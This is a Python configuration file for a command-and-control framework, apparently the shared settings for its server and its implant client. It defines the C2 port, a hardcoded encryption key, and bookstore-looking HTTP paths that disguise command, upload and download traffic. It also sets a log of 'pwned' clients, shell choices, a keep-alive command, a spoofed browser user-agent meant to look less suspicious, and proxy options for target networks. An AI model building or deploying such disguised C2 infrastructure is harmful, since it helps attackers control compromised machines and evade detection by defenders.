# --------------- variables (for both client and server) ------------------------ 

# port the c2 server litening on
PORT = 8888


# key for fernet aes/cbc encryption
KEY = "DKIVKFEadfKFI3435346!"

# Path to use for signifying the file download request form client http GET
FILE_REQUEST = "/auther?name="

# Path for signifying the file upload request from client http PUT
FILE_PUT = "/reviews"

# path to specify a command request from a client http get
CMD_REQUEST = "/book?isbn="

# path to signifying command output from a client http post
CMD_RESPONSE = "/inventory"

# path to use for signigying the present working directory form client http POST
PWD_RESPONSE = "/title"

# POST variable name used for assigning to command output form client
CMD_RESPONSE_KEY = "index"

# the password for zip files; must be byte type
ZIP_PASS = b"********NERVER_SKIP_SPINAL_DAY********"

# --------------- variables (for server) ------------------------ 

# leave blank to bind to all interface, or specific a adress
BIND_ADDR = ''

# direcctory for files upload from client
INCOMING = "incoming"

# directory for file download to clients
OUTGOING = "outgoing"

# log file for recording compromised client
LOG = "pwned.log"

# set shell for linux
SHELL = "/bin/bash"

# set shell for windows
#SHELL = "cmd.exe"


# --------------- variables (for client) ------------------------ 

#our SERVER ADDR
C2_SERVER = "localhost"

#command timeout for input prompt in seconds; 225 is about right for azure; set to none of not needed
# INPUT_TIMEOUT = 5
INPUT_TIMEOUT  = None   

# running this command to prevent our client being killed
KEEP_ALIVE_CMD = "whoami"
# KEEP_ALIVE_CMD = "time /T" # for windows
# KEEP_ALIVE_CMD = "date +%R" # for linux

#make our user-agent less suspicious
HEADER = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'}

#set the proxy according the target network, if you know
#PROXY = {"https" : "proxy.somesite.com:443"}
PROXY = None

# define the DELAY time for sleep()
DELAY = 3
